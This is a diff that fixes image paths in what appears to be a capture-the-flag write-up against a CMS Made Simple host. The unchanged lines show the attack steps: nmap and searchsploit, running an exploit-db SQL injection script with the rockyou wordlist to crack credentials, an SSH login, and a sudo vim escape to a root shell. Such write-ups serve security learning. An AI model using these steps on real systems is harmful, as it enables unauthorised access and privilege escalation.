@@ -6,7 +6,7 @@
  nmap -sV IP
 ### Output:
 
- ![Scan Nmap](images\NmapScan.png)
+ ![Scan Nmap](images/NmapScan.png)
 
 ## Directory enumeration 
 ### Command:
@@ -23,7 +23,7 @@
  searchsploit cms made simple
 ### Output:
 
- ![alt text](images\Search.png)
+ ![alt text](images/Search.png)
 
 ### Command:
  cat /usr/share/exploitdb/exploits/php/webapps/46635.py
@@ -36,7 +36,7 @@
  python2 46635.py -u http://IP/simple/ -c -w /usr/share/wordlists/rockyou.txt 
 ### Output:
 
- ![alt text](images\exploit.png)
+ ![alt text](images/exploit.png)
 
 ### explanation:
  The script attempts to crack the extracted password hashes offline using the rockyou.txt wordlist to reveal valid credentials for access.
@@ -47,7 +47,7 @@
  password: secret
 ### Output:
 
- ![alt text](images\sshAccess.png)
+ ![alt text](images/sshAccess.png)
 
 ## User Enumeration
  Searching for an other user in the home directory
@@ -59,7 +59,7 @@
 ## Root Access
 ### Command:
  sudo -l
- This command lists the programs the current user (mitch) is allowed to run with sudo.
+ (This command lists the programs the current user (mitch) is allowed to run with sudo.)
 ### Output:
  User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
@@ -73,7 +73,7 @@
  This tells Vim to launch a Bash shell. Since Vim is running as root, the spawned shell also runs as root.
 ### Output:
 
-![alt text](images\rootAcces.png)
+![alt text](images/rootAcces.png)
 
 
 
